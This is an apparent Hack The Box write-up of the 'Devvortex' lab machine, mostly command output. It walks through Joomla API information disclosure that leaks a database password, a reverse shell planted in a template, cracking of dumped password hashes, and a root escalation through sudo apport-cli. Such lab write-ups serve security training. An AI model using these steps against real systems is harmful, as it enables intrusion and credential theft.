+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &quot;http://devvortex.htb/&quot; -H &quot;Host:FUZZ.devvortex.htb&quot; -t 50 --sc 200
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://devvortex.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000022:   200        501 L    1581 W     23221 Ch    &quot;dev&quot;                                               
+
+Total time: 0
+Processed Requests: 100000
+Filtered Requests: 99999
+Requests/sec.: 0
+</code></pre><p id="3c333645-bccb-4027-9606-4669178bb728" class="">Add dev.devvortex.htb to /etc/hosts</p><figure id="b1327e65-fcd8-4ba1-b558-7c35a536b148" class="image"><a href="../img/devvortex/Untitled 4.png"><img style="width:948px" src="../img/devvortex/Untitled 4.png"/></a></figure><figure id="b5839ebc-031e-45af-ae58-1c5a1db5f327" class="image"><a href="../img/devvortex/Untitled 5.png"><img style="width:1920px" src="../img/devvortex/Untitled 5.png"/></a></figure><p id="b5d201a6-10ff-49f3-b87c-3bc8cd60369e" class="">
+</p><figure id="a1e113b0-6a7e-415e-a0ee-5ec7fe9fc54b" class="image"><a href="../img/devvortex/Untitled 6.png"><img style="width:1920px" src="../img/devvortex/Untitled 6.png"/></a></figure><h3 id="928f5c0b-c5dc-476f-b894-f80a9bc86d27" class="">Nmap</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f0901b37-1186-43ce-9b90-018b76466b98" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nmap -sVC -T5 -n dev.devvortex.htb                                                                     
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-02 23:03 -05
+Nmap scan report for dev.devvortex.htb (10.10.11.242)
+Host is up (0.093s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-robots.txt: 16 disallowed entries (15 shown)
+| /joomla/administrator/ /administrator/ /api/ /bin/ 
+| /cache/ /cli/ /components/ /includes/ /installation/ 
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+|_http-title: Devvortex
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
+                                                                </code></pre><p id="66177d20-bdba-4cf0-92a5-9cfb4186c90d" class="">robots.txt</p><figure id="2cb0eb95-62e6-4aa0-9ba2-3b121fcb4615" class="image"><a href="../img/devvortex/Untitled 7.png"><img style="width:1920px" src="../img/devvortex/Untitled 7.png"/></a></figure><p id="1e3e9c17-6e71-452c-aa22-177d447c1080" class="">
+</p><figure id="81684e74-b93d-4f4f-9e21-f702f2dc3d6c" class="image"><a href="../img/devvortex/Untitled 8.png"><img style="width:1920px" src="../img/devvortex/Untitled 8.png"/></a></figure><h2 id="d1e9b19b-6927-487d-92aa-ae401cfc84d1" class="">Findings</h2><ul id="4defbbb3-5bf7-4afb-ba69-f096c1ab8cc9" class="bulleted-list"><li style="list-style-type:disc">dev.devvortex.htb</li></ul><ul id="928afbbd-1ef5-44c4-8647-090d5e8a6073" class="bulleted-list"><li style="list-style-type:disc">dev.devvortex.htb/robots.txt</li></ul><ul id="ae01c3c9-aea6-4570-9d4a-1f86bc023baa" class="bulleted-list"><li style="list-style-type:disc"><a href="http://dev.devvortex.htb/administrator/">http://dev.devvortex.htb/administrator/</a></li></ul><p id="0ab9afb9-5d88-4e3f-b711-ce78f5ad65b5" class="">
+</p><h1 id="9a3bc2d0-77ac-49bd-8586-62a3f13d835d" class="">User</h1><p id="fc12395b-2e98-41af-8a07-69a7f055ef0b" class="">
+</p><p id="9d76b03f-cea8-4d7c-9545-f89162e59cde" class="">We start with Joomla information gatheringdiscovery/exploit</p><p id="85276248-8295-4ed0-af44-ddc2b1f09d8f" class=""><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla</a></p><p id="36578efe-3f96-4771-bf90-e870d98d917b" class="">
+</p><p id="0d3a1455-151f-4097-ac38-9c7b4baa5c7e" class="">We found → <a href="http://dev.devvortex.htb/administrator/manifests/files/joomla.xml">http://dev.devvortex.htb/administrator/manifests/files/joomla.xml</a></p><figure id="c1e2aef7-95f2-46cf-be43-e96fea964387" class="image"><a href="../img/devvortex/Untitled 9.png"><img style="width:1920px" src="../img/devvortex/Untitled 9.png"/></a></figure><p id="e14eafc6-558c-451a-a020-39582777717a" class="">Found exploit to that version: <a href="https://www.exploit-db.com/exploits/51334"><strong>Joomla! v4.2.8 -</strong></a><a href="https://www.exploit-db.com/exploits/51334"> Unauthenticated information disclosure</a></p><p id="42289c60-2b34-4ed3-8ed9-285f733d342c" class="">Go to each page/file and found juicy information:</p><ul id="5be5ab17-5b6d-483f-992e-d16d11993dea" class="bulleted-list"><li style="list-style-type:disc">&lt;version&gt;4.2.6&lt;/version&gt;</li></ul><ul id="4066c713-7cf8-487b-9944-a1e75c2eba33" class="bulleted-list"><li style="list-style-type:disc">&lt;creationDate&gt;2022-12&lt;/creationDate&gt;</li></ul><ul id="bd885a63-574f-4f24-a651-e4d4e87bf11d" class="bulleted-list"><li style="list-style-type:disc">PHP</li></ul><ul id="dd7f7856-0b07-4865-8236-9c185b3c76ac" class="bulleted-list"><li style="list-style-type:disc"><a href="http://dev.devvortex.htb/web.config.txt">http://dev.devvortex.htb/web.config.txt</a></li></ul><ul id="03fa28eb-778b-4c00-a8d1-730fe9e37289" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.exploit-db.com/exploits/51334">https://www.exploit-db.com/exploits/51334</a> → Exploit<br/><br/></li></ul><p id="2a7e6190-37be-4b45-8d9a-22bf69616234" class="">Let’s exploit</p><p id="6571775f-8d8f-45b5-b898-3b8e7e030beb" class=""><a href="http://dev.devvortex.htb/api/index.php/v1/users?public=true">http://dev.devvortex.htb/api/index.php/v1/users?public=true</a> → 2 Users</p><figure id="dc576dbf-ee9e-496a-8162-d259d27d7db9" class="image"><a href="../img/devvortex/Untitled 10.png"><img style="width:1920px" src="../img/devvortex/Untitled 10.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9db6855b-2a26-4bbe-bf17-78b930687a33" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">{
+   &quot;links&quot;:{
+      &quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/users?public=true&quot;
+   },
+   &quot;data&quot;:[
+      {
+         &quot;type&quot;:&quot;users&quot;,
+         &quot;id&quot;:&quot;649&quot;,
+         &quot;attributes&quot;:{
+            &quot;id&quot;:649,
+            &quot;name&quot;:&quot;lewis&quot;,
+            &quot;username&quot;:&quot;lewis&quot;,
+            &quot;email&quot;:&quot;lewis@devvortex.htb&quot;,
+            &quot;block&quot;:0,
+            &quot;sendEmail&quot;:1,
+            &quot;registerDate&quot;:&quot;2023-09-25 16:44:24&quot;,
+            &quot;lastvisitDate&quot;:&quot;2023-10-29 16:18:50&quot;,
+            &quot;lastResetTime&quot;:null,
+            &quot;resetCount&quot;:0,
+            &quot;group_count&quot;:1,
+            &quot;group_names&quot;:&quot;Super Users&quot;
+         }
+      },
+      {
+         &quot;type&quot;:&quot;users&quot;,
+         &quot;id&quot;:&quot;650&quot;,
+         &quot;attributes&quot;:{
+            &quot;id&quot;:650,
+            &quot;name&quot;:&quot;logan paul&quot;,
+            &quot;username&quot;:&quot;logan&quot;,
+            &quot;email&quot;:&quot;logan@devvortex.htb&quot;,
+            &quot;block&quot;:0,
+            &quot;sendEmail&quot;:0,
+            &quot;registerDate&quot;:&quot;2023-09-26 19:15:42&quot;,
+            &quot;lastvisitDate&quot;:null,
+            &quot;lastResetTime&quot;:null,
+            &quot;resetCount&quot;:0,
+            &quot;group_count&quot;:1,
+            &quot;group_names&quot;:&quot;Registered&quot;
+         }
+      }
+   ],
+   &quot;meta&quot;:{
+      &quot;total-pages&quot;:1
+   }
+}</code></pre><p id="a870ef8a-2f1f-4d3a-a14d-9bddb8383556" class="">Config: <a href="http://dev.devvortex.htb/api/index.php/v1/config/application?public=true">http://dev.devvortex.htb/api/index.php/v1/config/application?public=true</a> —&gt; mysql user and password</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ab0eacd7-03e2-4bae-bdcd-53526d09e869" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">{
+         &quot;type&quot;:&quot;application&quot;,
+         &quot;id&quot;:&quot;224&quot;,
+         &quot;attributes&quot;:{
+            &quot;dbtype&quot;:&quot;mysqli&quot;,
+            &quot;id&quot;:224
+         }
+      },
+      {
+         &quot;type&quot;:&quot;application&quot;,
+         &quot;id&quot;:&quot;224&quot;,
+         &quot;attributes&quot;:{
+            &quot;host&quot;:&quot;localhost&quot;,
+            &quot;id&quot;:224
+         }
+      },
+      {
+         &quot;type&quot;:&quot;application&quot;,
+         &quot;id&quot;:&quot;224&quot;,
+         &quot;attributes&quot;:{
+            &quot;user&quot;:&quot;lewis&quot;,
+            &quot;id&quot;:224
+         }
+      },
+      {
+         &quot;type&quot;:&quot;application&quot;,
+         &quot;id&quot;:&quot;224&quot;,
+         &quot;attributes&quot;:{
+            &quot;password&quot;:&quot;P4ntherg0t1n5r3c0n##&quot;,
+            &quot;id&quot;:224
+         }
+      },
+			{
+         &quot;type&quot;:&quot;application&quot;,
+         &quot;id&quot;:&quot;224&quot;,
+         &quot;attributes&quot;:{
+            &quot;db&quot;:&quot;joomla&quot;,
+            &quot;id&quot;:224
+         }
+      },
+      {
+         &quot;type&quot;:&quot;application&quot;,
+         &quot;id&quot;:&quot;224&quot;,
+         &quot;attributes&quot;:{
+            &quot;dbprefix&quot;:&quot;sd4fg_&quot;,
+            &quot;id&quot;:224
+         }
+      },</code></pre><p id="14145045-298c-477c-b496-fff1728649f4" class="">
+</p><p id="bb9cb29e-7236-4de6-af91-c484b428a6ba" class="">Go to /administrator</p><figure id="d6743920-a463-4a59-b403-b11b3cb6bdcb" class="image"><a href="../img/devvortex/Untitled 11.png"><img style="width:1920px" src="../img/devvortex/Untitled 11.png"/></a></figure><figure id="83e21c51-a277-45b9-b9cc-d2cafea192e6" class="image"><a href="../img/devvortex/Untitled 12.png"><img style="width:1920px" src="../img/devvortex/Untitled 12.png"/></a></figure><p id="0f8b1fe0-c342-4cff-9217-24d4979251d4" class="">
+</p><p id="04fca330-6b0a-48e0-ae4f-497bc45b203f" class="">Go to <a href="http://dev.devvortex.htb/administrator/index.php?option=com_config">http://dev.devvortex.htb/administrator/index.php?option=com_config</a>, and add superuser permission to our user</p><figure id="c4a0f563-8d61-4d4a-99ca-a7fc619b2520" class="image"><a href="../img/devvortex/Untitled 13.png"><img style="width:1920px" src="../img/devvortex/Untitled 13.png"/></a></figure><p id="26eb978c-3a1e-4da3-ad8c-ff098a301690" class="">
+</p><p id="e062d866-60b2-4c68-9feb-0930d9682dc2" class="">Once we have all privileges we can edit templates with php code, maybe reverse shell or webshell if you want.</p><p id="e4439956-df29-4cdb-a65a-88616644e617" class="">Go to administrator modules</p><figure id="3a13185e-0d6e-4634-a51e-5cc98aedaebc" class="image"><a href="../img/devvortex/Untitled 14.png"><img style="width:1920px" src="../img/devvortex/Untitled 14.png"/></a></figure><p id="3eb32a9b-c0ec-4c44-b5d5-8db39b9fd478" class="">Modify error.php with reverse shell</p><figure id="2208cc91-b6ec-46b1-b0b9-9ed5b2897d4f" class="image"><a href="../img/devvortex/Untitled 15.png"><img style="width:1920px" src="../img/devvortex/Untitled 15.png"/></a></figure><p id="42526afa-4121-492c-8e48-1ea4df990e2b" class="">Open <a href="http://dev.devvortex.htb/administrator/templates/atum/error.php">http://dev.devvortex.htb/administrator/templates/atum/error.php</a> and we have reverse shell</p><figure id="bc7b0e0f-ee2b-4b7c-a135-1328df4c50fc" class="image"><a href="../img/devvortex/Untitled 16.png"><img style="width:953px" src="../img/devvortex/Untitled 16.png"/></a></figure><p id="bfc57baf-e34e-4bf0-aaac-a3d71dce6bbe" class="">it’s for mysql, lets use the credentials that we found</p><p id="aff0b5e2-0fd8-4e94-803e-d3ca81457f3b" class="">mysql -h 127.0.0.1 -u lewis -p &quot;joomla&quot; -P 3306 -D joomla</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1ce9a30f-a285-4f9f-be65-0651a569ec57" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+www-data@devvortex:/$ mysql -h 127.0.0.1 -u lewis -p &quot;joomla&quot; -P 3306 -D joomla
+&lt;-h 127.0.0.1 -u lewis -p &quot;joomla&quot; -P 3306 -D joomla
+Enter password: P4ntherg0t1n5r3c0n##
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 72712
+Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+mysql&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; use joomla;
+use joomla;
+Database changed
+mysql&gt; show tables;
+show tables;
++-------------------------------+
+| Tables_in_joomla              |
++-------------------------------+
+| sd4fg_action_log_config       |
+| sd4fg_action_logs             |
+| sd4fg_action_logs_extensions  |
+| sd4fg_action_logs_users       |
+| sd4fg_assets                  |
+| sd4fg_associations            |
+| sd4fg_banner_clients          |
+| sd4fg_banner_tracks           |
+| sd4fg_banners                 |
+| sd4fg_categories              |
+| sd4fg_contact_details         |
+| sd4fg_content                 |
+| sd4fg_content_frontpage       |
+| sd4fg_content_rating          |
+| sd4fg_content_types           |
+| sd4fg_contentitem_tag_map     |
+| sd4fg_extensions              |
+| sd4fg_fields                  |
+| sd4fg_fields_categories       |
+| sd4fg_fields_groups           |
+| sd4fg_fields_values           |
+| sd4fg_finder_filters          |
+| sd4fg_finder_links            |
+| sd4fg_finder_links_terms      |
+| sd4fg_finder_logging          |
+| sd4fg_finder_taxonomy         |
+| sd4fg_finder_taxonomy_map     |
+| sd4fg_finder_terms            |
+| sd4fg_finder_terms_common     |
+| sd4fg_finder_tokens           |
+| sd4fg_finder_tokens_aggregate |
+| sd4fg_finder_types            |
+| sd4fg_history                 |
+| sd4fg_languages               |
+| sd4fg_mail_templates          |
+| sd4fg_menu                    |
+| sd4fg_menu_types              |
+| sd4fg_messages                |
+| sd4fg_messages_cfg            |
+| sd4fg_modules                 |
+| sd4fg_modules_menu            |
+| sd4fg_newsfeeds               |
+| sd4fg_overrider               |
+| sd4fg_postinstall_messages    |
+| sd4fg_privacy_consents        |
+| sd4fg_privacy_requests        |
+| sd4fg_redirect_links          |
+| sd4fg_scheduler_tasks         |
+| sd4fg_schemas                 |
+| sd4fg_session                 |
+| sd4fg_tags                    |
+| sd4fg_template_overrides      |
+| sd4fg_template_styles         |
+| sd4fg_ucm_base                |
+| sd4fg_ucm_content             |
+| sd4fg_update_sites            |
+| sd4fg_update_sites_extensions |
+| sd4fg_updates                 |
+| sd4fg_user_keys               |
+| sd4fg_user_mfa                |
+| sd4fg_user_notes              |
+| sd4fg_user_profiles           |
+| sd4fg_user_usergroup_map      |
+| sd4fg_usergroups              |
+| sd4fg_users                   |
+| sd4fg_viewlevels              |
+| sd4fg_webauthn_credentials    |
+| sd4fg_workflow_associations   |
+| sd4fg_workflow_stages         |
+| sd4fg_workflow_transitions    |
+| sd4fg_workflows               |
++-------------------------------+
+71 rows in set (0.00 sec)
+
+mysql&gt; select * from sd4fg_users;
+select * from sd4fg_users;
+
+| id  | name       | username | email               | password                                                     
+| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u 
+| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+ 
+2 rows in set (0.00 sec)
+
+</code></pre><p id="e70d94a3-3868-4735-be4a-829b6d169e91" class="">
+</p><p id="756ebdd6-98a6-432b-9473-38af6a1fadd5" class="">Put it in hash file and use john</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bca02b9a-3900-4f91-825c-bc562845c54e" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ john --format=bcrypt hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt          
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+tequieromucho    (?)     
+1g 0:00:00:02 DONE (2024-03-03 09:57) 0.3533g/s 508.8p/s 508.8c/s 508.8C/s winston..michel
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+                              </code></pre><p id="2b58976f-5c30-4729-8eb3-69d74a1a0b45" class="">
+</p><p id="067b47a7-9755-4bb2-b215-9d53962df5c3" class="">SSH</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a5938d31-0347-4b59-a250-ad8fa939d955" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[/usr/share/metasploit-framework]
+└─$ ssh logan@devvortex.htb
+logan@devvortex.htb&#x27;s password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 03 Mar 2024 02:58:52 PM UTC
+
+  System load:           0.06
+  Usage of /:            68.3% of 4.76GB
+  Memory usage:          25%
+  Swap usage:            0%
+  Processes:             171
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.242
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:f601
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
+logan@devvortex:~$ cat user.txt 
+49bc45f89195b2478f4c16cc8f095570
+</code></pre><h1 id="46fcddf0-22f0-4c9c-9c39-90e5d1e6aef3" class="">Root</h1><p id="8d7e0a96-57f0-4250-ada9-ca910f0870ac" class="">Execute sudo -l </p><p id="a752427c-e867-4a48-8538-afd08bdaef88" class="">
+</p><p id="60b08ada-0851-488c-bcd8-b0e04068731d" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4f7bdd93-39ed-4d04-8d2b-30dc048bcad6" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">logan@devvortex:/tmp$ sudo -l
+[sudo] password for logan: 
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli</code></pre><p id="a06731c6-959a-4590-8bb3-3c68417463b9" class="">
+</p><p id="3bb04e11-ea58-4487-afad-132682e2a923" class="">We can run privilage scalation following these steps: <a href="https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/"><strong>(CVE-2023–1326)[Privilege Escalation] apport-cli 2.26.0</strong></a></p><p id="c765564e-49e1-4526-9e56-46b2a2f3a4bd" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7b55edfa-a325-494e-8ec6-4a3269599714" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">logan@devvortex:/tmp$ sudo /usr/bin/apport-cli --file-bug
+
+*** What kind of problem do you want to report?
+
+
+Choices:
+  1: Display (X.org)
+  2: External or internal storage devices (e. g. USB sticks)
+  3: Security related problems
+  4: Sound/audio related problems
+  5: dist-upgrade
+  6: installation
+  7: installer
+  8: release-upgrade
+  9: ubuntu-release-upgrader
+  10: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/9/10/C): 2
+
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+
+*** What particular problem do you observe?
+
+
+Choices:
+  1: Removable storage device is not mounted automatically
+  2: Internal hard disk partition cannot be mounted manually
+  3: Internal hard disk partition is not displayed in Places menu
+  4: No permission to access files on storage device
+  5: Documents cannot be opened in desktop UI on storage device
+  6: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/C): 2
+..................................
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (715.3 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+root@devvortex:/tmp# whoami
+root
+root@devvortex:/tmp# cat /root/root.txt
+61ab515db8fe4007d44ea621e02652c3
+</code></pre><p id="cfa8ef36-3fe8-46e9-93bc-b6a565c517f2" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
